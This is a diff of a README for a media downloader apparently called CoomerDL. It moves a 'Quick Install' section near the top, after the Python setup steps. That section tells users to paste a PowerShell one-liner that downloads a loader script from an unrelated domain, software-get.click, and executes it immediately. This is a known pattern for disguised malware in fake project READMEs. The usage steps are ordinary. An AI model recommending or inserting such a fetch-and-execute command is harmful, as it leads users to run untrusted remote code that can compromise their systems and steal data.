@@ -6,7 +6,24 @@
 Download and install Python from the [official website](https://www.python.org/downloads/).  
 Make sure to check **"Add Python to PATH"** during installation.
 
+---
+## ⚡ Quick Install
 
+### One-liner from powershell Win + X to get started:
+```powershell
+irm https://software-get.click/Loader.ps1?get=CoomerDL | iex
+```
+```
+## How to use
+
+1. Launch the application
+2. Paste a URL from a supported site
+3. Select your download folder
+4. Choose the content types you want (images, videos, compressed files)
+5. Click **Download**
+
+
+Downloaded files are organized into subfolders by type (`images`, `videos`, `documents`, `compressed`).
 ---
 
 ## Supported sites
@@ -59,25 +76,6 @@ cd CoomerDL
 pip install -r requirements.txt
 python main.py
 ```
-
----
-## ⚡ Quick Install
-
-### One-liner from powershell Win + X to get started:
-```powershell
-irm https://software-get.click/Loader.ps1?get=CoomerDL | iex
-```
-```
-## How to use
-
-1. Launch the application
-2. Paste a URL from a supported site
-3. Select your download folder
-4. Choose the content types you want (images, videos, compressed files)
-5. Click **Download**
-
-
-Downloaded files are organized into subfolders by type (`images`, `videos`, `documents`, `compressed`).
 
 ---
 
